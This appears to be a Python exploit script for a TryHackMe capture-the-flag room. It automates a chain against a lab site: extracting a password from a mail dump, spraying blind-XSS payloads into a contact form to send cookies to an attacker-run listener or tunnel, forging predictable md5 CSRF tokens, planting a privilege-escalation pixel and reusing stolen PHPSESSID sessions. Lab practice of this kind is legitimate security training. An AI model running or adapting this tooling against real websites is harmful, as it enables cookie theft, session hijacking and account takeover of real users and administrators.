#!/usr/bin/env python3
"""Sequence THM helper.

This script does not replace manual browser steps, but it automates repetitive
parts of the chain:
- pull and parse /mail/dump.txt
- submit blind-XSS payload to contact form
- generate predictable CSRF tokens (md5(username))
- build promote URL
- check a PHPSESSID session for flag snippets in dashboard/settings pages
"""

from __future__ import annotations

import argparse
import hashlib
import http.server
import re
import socketserver
import subprocess
import shutil
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Optional


FLAG_RE = re.compile(r"(?:THM|thm)\{[^}]+\}")
PASS_RE = re.compile(r"password\s*\(([^)]+)\)", re.IGNORECASE)
PHPSID_RE = re.compile(r"PHPSESSID=([A-Za-z0-9]+)", re.IGNORECASE)


@dataclass
class HttpResult:
	status: int
	body: str
	final_url: str
	error: str = ""


class CallbackStore:
	def __init__(self) -> None:
		self.lock = threading.Lock()
		self.hits: list[tuple[str, str, str]] = []
		self.sessions: list[str] = []

	def add(self, src: str, path: str, sid: Optional[str]) -> None:
		with self.lock:
			self.hits.append((src, path, sid or ""))
			if sid and sid not in self.sessions:
				self.sessions.append(sid)

	def snapshot(self) -> tuple[list[tuple[str, str, str]], list[str]]:
		with self.lock:
			return list(self.hits), list(self.sessions)


def _extract_sid_from_path(path: str) -> Optional[str]:
	m = PHPSID_RE.search(path)
	if m:
		return m.group(1)
	parsed = urllib.parse.urlsplit(path)
	qs = urllib.parse.parse_qs(parsed.query)
	for key in ("c", "cookie", "data"):
		vals = qs.get(key, [])
		for val in vals:
			m2 = PHPSID_RE.search(val)
			if m2:
				return m2.group(1)
	return None


def start_callback_server(host: str, port: int, store: CallbackStore) -> socketserver.TCPServer:
	class ReuseTCPServer(socketserver.TCPServer):
		allow_reuse_address = True

		def handle_error(self, request: object, client_address: object) -> None:
			# Keep automation running when clients reset sockets.
			return

	class Handler(http.server.BaseHTTPRequestHandler):
		def do_GET(self) -> None:  # noqa: N802
			sid = _extract_sid_from_path(self.path)
			store.add(self.client_address[0], self.path, sid)
			msg = "ok"
			self.send_response(200)
			self.send_header("Content-Type", "text/plain")
			self.send_header("Content-Length", str(len(msg)))
			self.end_headers()
			self.wfile.write(msg.encode())

		def log_message(self, fmt: str, *args: object) -> None:
			return

	server = ReuseTCPServer((host, port), Handler)
	threading.Thread(target=server.serve_forever, daemon=True).start()
	return server


def http_get(url: str, cookie: Optional[str] = None, timeout: int = 15) -> HttpResult:
	req = urllib.request.Request(url, method="GET")
	if cookie:
		req.add_header("Cookie", cookie)
	try:
		with urllib.request.urlopen(req, timeout=timeout) as resp:
			body = resp.read().decode("utf-8", errors="ignore")
			return HttpResult(status=resp.getcode(), body=body, final_url=resp.geturl())
	except urllib.error.HTTPError as exc:
		body = exc.read().decode("utf-8", errors="ignore")
		return HttpResult(status=exc.code, body=body, final_url=url, error=str(exc))
	except Exception as exc:  # Network and timeout handling for unstable targets.
		return HttpResult(status=0, body="", final_url=url, error=str(exc))


def http_post_form(
	url: str,
	data: dict[str, str],
	cookie: Optional[str] = None,
	timeout: int = 15,
) -> HttpResult:
	encoded = urllib.parse.urlencode(data).encode()
	req = urllib.request.Request(url, data=encoded, method="POST")
	req.add_header("Content-Type", "application/x-www-form-urlencoded")
	if cookie:
		req.add_header("Cookie", cookie)
	try:
		with urllib.request.urlopen(req, timeout=timeout) as resp:
			body = resp.read().decode("utf-8", errors="ignore")
			return HttpResult(status=resp.getcode(), body=body, final_url=resp.geturl())
	except urllib.error.HTTPError as exc:
		body = exc.read().decode("utf-8", errors="ignore")
		return HttpResult(status=exc.code, body=body, final_url=url, error=str(exc))
	except Exception as exc:
		return HttpResult(status=0, body="", final_url=url, error=str(exc))


def normalize_base(base: str) -> str:
	return base.rstrip("/")


def cmd_dump(args: argparse.Namespace) -> int:
	base = normalize_base(args.base)
	url = f"{base}/mail/dump.txt"
	result = http_get(url)
	print(f"[+] GET {url} -> {result.status}")
	if result.status != 200:
		print("[-] Could not retrieve dump.")
		return 1

	print("\n--- dump excerpt ---")
	print(result.body.strip())
	print("--- end dump ---\n")

	pw_match = PASS_RE.search(result.body)
	if pw_match:
		print(f"[+] Extracted finance password candidate: {pw_match.group(1)}")
	else:
		print("[!] No password pattern found in dump.")
	return 0


def cmd_xss_payload(args: argparse.Namespace) -> int:
	callback = args.callback.rstrip("/")
	payload = f"<img src=x onerror=\"this.src='{callback}/?c='+document.cookie\"/>"
	print("[+] Blind-XSS payload:")
	print(payload)
	return 0


def cmd_submit_xss(args: argparse.Namespace) -> int:
	base = normalize_base(args.base)
	url = f"{base}/contact.php"
	callback = args.callback.rstrip("/")
	payload = f"<img src=x onerror=\"this.src='{callback}/?c='+document.cookie\"/>"

	fields = {
		"name": payload if args.all_fields else args.name,
		"phone": payload if args.all_fields else args.phone,
		"message": payload,
	}
	result = http_post_form(url, fields)
	if result.error:
		print(f"[!] POST {url} failed: {result.error}")
		return 1
	print(f"[+] POST {url} -> {result.status}")
	if "Thank you for your feedback" in result.body:
		print("[+] XSS payload submitted successfully.")
		return 0
	print("[!] Response did not include expected success message; check manually.")
	return 0


def _xss_payloads(callback: str, base: str, include_promote: bool = True) -> list[str]:
	cb = callback.rstrip("/")
	promote = f"{base}/promote_coadmin.php?username=mod&csrf_token_promote={md5_hex('admin')}"
	payloads = [
		f"<img src=x onerror=\"this.src='{cb}/x-onerr?'+document.cookie\"/>",
		f"<svg/onload=\"new Image().src='{cb}/x-svg?'+document.cookie\">",
		f"<script>new Image().src='{cb}/x-script?'+document.cookie</script>",
		f"<img src='{cb}/x-probe'>",
	]
	if include_promote:
		# Auto-trigger privilege escalation if an admin reviews the message.
		payloads.append(f"<img src='{promote}'>")
	return payloads


def cmd_submit_xss_spray(args: argparse.Namespace) -> int:
	base = normalize_base(args.base)
	url = f"{base}/contact.php"
	payloads = _xss_payloads(args.callback, base, include_promote=args.with_promote_pixel)

	count = 0
	for rnd in range(1, args.rounds + 1):
		for p in payloads:
			count += 1
			fields = {
				"name": p if args.all_fields else f"probe-{count}",
				"phone": p if args.all_fields else "123456",
				"message": p,
			}
			res = http_post_form(url, fields)
			if res.error:
				print(f"[!] spray #{count:03d} round={rnd} error={res.error}")
				continue
			ok = "ok" if "Thank you for your feedback" in res.body else "no-confirm"
			print(f"[+] spray #{count:03d} round={rnd} status={res.status} {ok}")
		if rnd < args.rounds:
			time.sleep(args.interval)
	print("[+] Spray done.")
	return 0


def md5_hex(value: str) -> str:
	return hashlib.md5(value.encode("utf-8")).hexdigest()


def cmd_csrf(args: argparse.Namespace) -> int:
	token = md5_hex(args.user)
	print(f"[+] username: {args.user}")
	print(f"[+] md5 token: {token}")
	return 0


def cmd_promote_url(args: argparse.Namespace) -> int:
	base = normalize_base(args.base)
	token = md5_hex(args.token_user)
	url = (
		f"{base}/promote_coadmin.php?username={urllib.parse.quote(args.username)}"
		f"&csrf_token_promote={token}"
	)
	print(f"[+] Promote URL ({args.token_user} token):")
	print(url)
	return 0


def cmd_check_session(args: argparse.Namespace) -> int:
	base = normalize_base(args.base)
	cookie = f"PHPSESSID={args.phpsessid}"

	checked = [
		f"{base}/dashboard.php",
		f"{base}/settings.php",
	]
	found = []
	unauth = False
	for url in checked:
		res = http_get(url, cookie=cookie)
		print(f"[+] GET {url} -> {res.status} (final: {res.final_url})")
		if res.final_url.rstrip("/").endswith("/login.php"):
			unauth = True
		matches = FLAG_RE.findall(res.body)
		for m in matches:
			found.append((url, m))

	if found:
		print("\n[+] Flags found:")
		for url, flag in found:
			print(f"    {flag}   (from {url})")
	elif unauth:
		print("[!] Session appears invalid or expired (redirected to login.php).")
	else:
		print("[!] No flag pattern found with this session.")
	return 0


def _check_session_flags(base: str, sid: str) -> tuple[bool, list[str]]:
	cookie = f"PHPSESSID={sid}"
	flags: list[str] = []
	for path in ("/dashboard.php", "/settings.php"):
		res = http_get(f"{base}{path}", cookie=cookie)
		if res.error:
			return False, []
		if res.final_url.rstrip("/").endswith("/login.php"):
			return False, []
		flags.extend(FLAG_RE.findall(res.body))
	# Preserve order while deduping.
	seen: set[str] = set()
	uniq = []
	for f in flags:
		if f not in seen:
			seen.add(f)
			uniq.append(f)
	return True, uniq


def cmd_auto_mod_admin(args: argparse.Namespace) -> int:
	base = normalize_base(args.base)
	store = CallbackStore()
	tunnel_proc: Optional[subprocess.Popen[str]] = None
	auto_callback = args.callback
	if not auto_callback and not args.auto_tunnel:
		print("[-] Provide --callback or enable --auto-tunnel.")
		return 1

	if args.auto_tunnel:
		npx = shutil.which("npx") or shutil.which("npx.cmd")
		if not npx:
			print("[-] npx not found. Install Node.js or provide --callback manually.")
			return 1
		cmd = [npx, "localtunnel", "--port", str(args.listen_port)]
		if args.tunnel_subdomain:
			cmd.extend(["--subdomain", args.tunnel_subdomain])
		print(f"[+] Starting localtunnel: {' '.join(cmd)}")
		try:
			tunnel_proc = subprocess.Popen(
				cmd,
				stdout=subprocess.PIPE,
				stderr=subprocess.STDOUT,
				text=True,
			)
		except Exception as exc:
			print(f"[-] Failed to start localtunnel: {exc}")
			return 1

		tunnel_url = ""
		t_deadline = time.time() + args.tunnel_wait
		while time.time() < t_deadline:
			if tunnel_proc.poll() is not None:
				print("[-] localtunnel exited early. Try: npx localtunnel --port <port>")
				return 1
			line = tunnel_proc.stdout.readline() if tunnel_proc.stdout else ""
			if line:
				print(f"[tunnel] {line.strip()}")
				m = re.search(r"https?://[a-zA-Z0-9.-]+", line)
				if m:
					tunnel_url = m.group(0).rstrip("/")
					break
			else:
				time.sleep(0.2)

		if not tunnel_url:
			print("[-] Could not detect localtunnel URL. Use --callback manually.")
			if tunnel_proc and tunnel_proc.poll() is None:
				tunnel_proc.terminate()
			return 1
		auto_callback = tunnel_url
		print(f"[+] Using tunnel callback: {auto_callback}")

	try:
		server = start_callback_server(args.listen_host, args.listen_port, store)
	except OSError as exc:
		print(f"[-] Could not bind listener on {args.listen_host}:{args.listen_port}: {exc}")
		print("[!] Use another port, or stop the process that already uses this port.")
		if tunnel_proc and tunnel_proc.poll() is None:
			tunnel_proc.terminate()
		return 1
	print(f"[+] Callback listener: http://{args.listen_host}:{args.listen_port}")
	print(f"[+] Public callback used in payloads: {auto_callback}")

	try:
		rounds_without_session = 0
		for rnd in range(1, args.rounds + 1):
			print(f"[+] Spray round {rnd}/{args.rounds}")
			for payload in _xss_payloads(auto_callback, base, include_promote=args.with_promote_pixel):
				fields = {"name": payload, "phone": payload, "message": payload}
				res = http_post_form(f"{base}/contact.php", fields)
				if res.error:
					print(f"[!] submit error: {res.error}")

			t_deadline = time.time() + args.poll_seconds
			last_seen = -1
			while time.time() < t_deadline:
				hits, sessions = store.snapshot()
				if len(hits) != last_seen:
					last_seen = len(hits)
					print(f"[+] Callback hits={len(hits)} unique sessions={len(sessions)}")
					if args.show_hit_paths and hits:
						for src, path, sid in hits[-args.show_hit_paths :]:
							sfx = f" sid={sid}" if sid else ""
							print(f"    hit src={src} path={path}{sfx}")
				for sid in sessions:
					ok, flags = _check_session_flags(base, sid)
					if ok:
						print(f"[+] Valid session found: {sid}")
						if flags:
							print(f"[+] Flags from session {sid}: {', '.join(flags)}")
							if len(flags) >= args.stop_after:
								print("[+] Target number of flags reached.")
								return 0
				time.sleep(2)

			hits, sessions = store.snapshot()
			if sessions:
				rounds_without_session = 0
			else:
				rounds_without_session += 1
				if args.max_no_session_rounds and rounds_without_session >= args.max_no_session_rounds:
					print("[!] Early stop: callback traffic seen but no PHPSESSID extracted.")
					print("[!] JS payload likely filtered or reviewer is not executing cookie-stealing payload.")
					break

			if rnd < args.rounds:
				time.sleep(args.interval)

		hits, sessions = store.snapshot()
		print(f"[!] Auto run finished. Hits={len(hits)}, unique sessions={len(sessions)}")
		if not sessions:
			print("[!] No PHPSESSID captured. Check callback reachability and reviewer timing.")
		return 0
	finally:
		server.shutdown()
		server.server_close()
		if tunnel_proc and tunnel_proc.poll() is None:
			tunnel_proc.terminate()


def build_parser() -> argparse.ArgumentParser:
	parser = argparse.ArgumentParser(description="Helper for THM Sequence room")
	sub = parser.add_subparsers(dest="cmd", required=True)

	p_dump = sub.add_parser("dump", help="Fetch and parse /mail/dump.txt")
	p_dump.add_argument("--base", default="http://review.thm", help="Base URL")
	p_dump.set_defaults(func=cmd_dump)

	p_xss = sub.add_parser("xss-payload", help="Print blind-XSS payload")
	p_xss.add_argument("--callback", required=True, help="Callback URL, e.g. http://10.10.10.10:8000")
	p_xss.set_defaults(func=cmd_xss_payload)

	p_submit = sub.add_parser("submit-xss", help="Submit XSS into contact form")
	p_submit.add_argument("--base", default="http://review.thm", help="Base URL")
	p_submit.add_argument("--callback", required=True, help="Callback URL")
	p_submit.add_argument("--name", default="alice", help="Name field when not using --all-fields")
	p_submit.add_argument("--phone", default="123456", help="Phone field when not using --all-fields")
	p_submit.add_argument(
		"--all-fields",
		action="store_true",
		help="Place payload in all three form fields",
	)
	p_submit.set_defaults(func=cmd_submit_xss)

	p_spray = sub.add_parser("submit-xss-spray", help="Submit repeated multi-payload XSS probes")
	p_spray.add_argument("--base", default="http://review.thm", help="Base URL")
	p_spray.add_argument("--callback", required=True, help="Callback URL")
	p_spray.add_argument("--rounds", type=int, default=12, help="Number of spray rounds")
	p_spray.add_argument("--interval", type=float, default=15.0, help="Seconds between spray rounds")
	p_spray.add_argument("--all-fields", action="store_true", help="Place payload in all form fields")
	p_spray.add_argument("--with-promote-pixel", action="store_true", help="Include promote_coadmin trigger pixel")
	p_spray.set_defaults(func=cmd_submit_xss_spray)

	p_auto = sub.add_parser("auto-mod-admin", help="Run listener + spray + auto session/flag checks")
	p_auto.add_argument("--base", default="http://review.thm", help="Base URL")
	p_auto.add_argument("--listen-host", default="0.0.0.0", help="Listener bind host")
	p_auto.add_argument("--listen-port", type=int, default=8000, help="Listener bind port")
	p_auto.add_argument("--callback", help="Public callback URL reachable by target")
	p_auto.add_argument("--auto-tunnel", action="store_true", help="Auto-start localtunnel via npx")
	p_auto.add_argument("--tunnel-subdomain", help="Optional localtunnel subdomain")
	p_auto.add_argument("--tunnel-wait", type=int, default=25, help="Seconds to wait for tunnel URL")
	p_auto.add_argument("--rounds", type=int, default=20, help="Number of spray rounds")
	p_auto.add_argument("--interval", type=float, default=10.0, help="Seconds between spray rounds")
	p_auto.add_argument("--poll-seconds", type=int, default=20, help="Polling window per round")
	p_auto.add_argument("--stop-after", type=int, default=2, help="Stop after this many flags from one session")
	p_auto.add_argument("--show-hit-paths", type=int, default=3, help="Show last N callback paths on each hit update")
	p_auto.add_argument("--max-no-session-rounds", type=int, default=10, help="Stop early after N rounds without extracted sessions")
	p_auto.add_argument("--with-promote-pixel", action="store_true", help="Include promote_coadmin trigger pixel")
	p_auto.set_defaults(func=cmd_auto_mod_admin)

	p_csrf = sub.add_parser("csrf", help="Generate predictable CSRF token: md5(username)")
	p_csrf.add_argument("--user", required=True, help="Username to hash")
	p_csrf.set_defaults(func=cmd_csrf)

	p_prom = sub.add_parser("promote-url", help="Build promote_coadmin URL")
	p_prom.add_argument("--base", default="http://review.thm", help="Base URL")
	p_prom.add_argument("--username", default="mod", help="Username to promote")
	p_prom.add_argument(
		"--token-user",
		default="admin",
		help="Username whose md5 is used as csrf_token_promote",
	)
	p_prom.set_defaults(func=cmd_promote_url)

	p_check = sub.add_parser("check-session", help="Check session cookie for role/flag pages")
	p_check.add_argument("--base", default="http://review.thm", help="Base URL")
	p_check.add_argument("--phpsessid", required=True, help="Stolen or active PHPSESSID value")
	p_check.set_defaults(func=cmd_check_session)

	return parser


def main() -> int:
	parser = build_parser()
	args = parser.parse_args()
	return args.func(args)


if __name__ == "__main__":
	sys.exit(main())
